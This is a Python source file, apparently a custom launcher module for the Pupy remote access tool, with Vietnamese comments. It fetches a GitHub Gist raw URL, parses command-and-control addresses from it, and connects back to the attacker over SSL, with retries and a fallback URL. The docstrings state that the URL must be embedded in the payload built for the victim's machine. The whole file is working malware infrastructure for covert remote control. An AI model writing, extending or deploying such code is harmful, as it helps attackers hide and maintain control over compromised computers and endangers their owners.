# -*- coding: utf-8 -*-
"""
Launcher gist: client lấy địa chỉ C2 (IPv6:port) từ Gist raw URL (GET).

- Payload (build sẵn): URL phải được NHÚNG lúc build qua launcher_args: -u <GIST_RAW_URL>.
  Trên máy nạn nhân không có .env; client đọc URL từ launcher_args đã embed.
- Chạy tay (test): có thể dùng .env (GIST_RAW_URL) hoặc -u/--gist-url.
"""

import argparse
import json
import os

from pupy.pupylib.utils.dotenv import load_dotenv
load_dotenv()

from pupy.network.lib.utils import (
    parse_transports_args,
    create_client_transport_info_for_addr,
    parse_host,
    HostInfo,
)
from pupy.network.lib.base_launcher import (
    LauncherError, LauncherArgumentParser, BaseLauncher
)
from pupy.network.conf import transports

from . import getLogger
logger = getLogger('gist')


def fetch_gist_content(raw_url, timeout=15, retries=3):
    """GET nội dung Gist raw URL. Retry khi lỗi/timeout. Trả về str hoặc None."""
    for attempt in range(max(1, retries)):
        try:
            import requests
            r = requests.get(raw_url, timeout=timeout)
            if r.status_code == 200:
                return r.text.strip()
        except Exception as e:
            logger.debug('fetch_gist attempt %d %s: %s', attempt + 1, raw_url[:50], e)
        try:
            from urllib.request import urlopen
            with urlopen(raw_url, timeout=timeout) as resp:
                return resp.read().decode('utf-8', errors='replace').strip()
        except Exception as e:
            logger.debug('fetch_gist urlopen attempt %d %s: %s', attempt + 1, raw_url[:50], e)
        if attempt < retries - 1:
            import time
            time.sleep(min(2 ** attempt, 10))
    return None


def parse_c2_content(content):
    """
    Parse nội dung Gist: [IPv6]:port hoặc host:port hoặc JSON.
    Trả về HostInfo(host, port, hostname) hoặc None.
    """
    if not content:
        return None
    line = content.split('\n')[0].strip()
    if not line:
        return None
    try:
        obj = json.loads(line)
        if isinstance(obj, dict):
            host = obj.get('host') or obj.get('ipv6') or obj.get('ip')
            port = obj.get('port')
            if host is not None and port is not None:
                return HostInfo(str(host).strip(), int(port), str(host).strip())
    except (ValueError, TypeError):
        pass
    return parse_host(line, default_port=443)


class GistLauncher(BaseLauncher):
    """Launcher lấy C2 từ Gist raw URL (GET), rồi connect như connect launcher."""

    name = 'gist'
    credentials = ['SSL_BIND_CERT']

    __slots__ = ('args', 'gist_url', 'gist_url_fallback', 'gist_timeout', 'opt_args')

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = LauncherArgumentParser(
            prog='gist', description=cls.__doc__
        )
        cls.arg_parser.add_argument(
            '-u', '--gist-url', metavar='<raw_url>',
            default=os.environ.get('GIST_RAW_URL', '').strip(),
            help='Gist raw URL. BẮT BUỘC nhúng khi build payload: gist -u <URL> -t ssl (máy nạn nhân không có .env)'
        )
        cls.arg_parser.add_argument(
            '-u2', '--gist-url-fallback', metavar='<raw_url>',
            default=os.environ.get('GIST_RAW_URL_2', '').strip(),
            help='URL dự phòng khi GIST chính lỗi (env: GIST_RAW_URL_2)'
        )
        cls.arg_parser.add_argument(
            '--gist-timeout', type=int, default=15, metavar='SEC',
            help='Timeout mỗi lần GET Gist (giây)'
        )
        cls.arg_parser.add_argument(
            '-t', '--transport', choices=transports, default='ssl',
            help='Transport to use'
        )
        cls.arg_parser.add_argument(
            'transport_args', nargs=argparse.REMAINDER,
            help='Transport arguments: key=value ...'
        )

    def parse_args(self, args):
        super(GistLauncher, self).parse_args(args)
        self.gist_url = (self.args.gist_url or '').strip()
        if not self.gist_url:
            raise LauncherError('gist: missing -u/--gist-url or GIST_RAW_URL in .env')
        self.gist_url_fallback = (getattr(self.args, 'gist_url_fallback', None) or '').strip()
        self.gist_timeout = max(5, min(120, getattr(self.args, 'gist_timeout', 15) or 15))
        remainder = getattr(self.args, 'transport_args', None)
        if remainder is None:
            remainder = []
        self.opt_args = parse_transports_args(remainder)
        self.set_default_transport(self.args.transport)

    def iterate(self):
        if self.args is None:
            raise LauncherError('parse_args needs to be called before iterate')
        urls = [self.gist_url]
        if self.gist_url_fallback:
            urls.append(self.gist_url_fallback)
        content = None
        for url in urls:
            content = fetch_gist_content(url, timeout=self.gist_timeout)
            if content:
                break
            logger.debug('Gist primary/fallback failed: %s', url[:50])
        hosts = []
        if content:
            # Hỗ trợ nhiều dòng / nhiều C2 trong một Gist:
            # - Mỗi dòng: host:port hoặc JSON dict
            # - Dùng parse_c2_content cho từng dòng, bỏ qua dòng lỗi
            for line in (l.strip() for l in content.splitlines() if l.strip()):
                hi = parse_c2_content(line)
                if hi:
                    hosts.append(hi)
        if not hosts:
            raise LauncherError('gist: could not parse C2 from Gist (empty or invalid)')

        last_error = None
        for host_info in hosts:
            logger.info('Gist C2 candidate: %s:%s', host_info.host, host_info.port)
            try:
                yield self.connect_to_host(host_info)
                self.reset_connection_info()
                return
            except EOFError as e:
                last_error = e
                logger.info('Connection closed for %s:%s: %s', host_info.host, host_info.port, e)
            except Exception as e:
                last_error = e
                logger.exception('Connect failed for %s:%s: %s', host_info.host, host_info.port, e)

        # Không kết nối được bất kỳ C2 nào
        raise LauncherError('gist: all C2 entries failed: {}'.format(last_error or 'unknown error'))

    def connect_to_host(self, host_info):
        transport_name = self.args.transport
        info = create_client_transport_info_for_addr(
            transport_name, host_info,
            self.opt_args, False
        )
        info.transport.parse_args(info.transport_args)
        client = info.transport.client(**info.client_args)
        sock = client.connect(host_info.host, host_info.port)
        stream = info.transport.stream(
            sock,
            info.transport.client_transport,
            info.transport_args
        )
        self.set_connection_info(
            host_info.hostname, host_info.host, host_info.port,
            None, transport_name
        )
        return stream
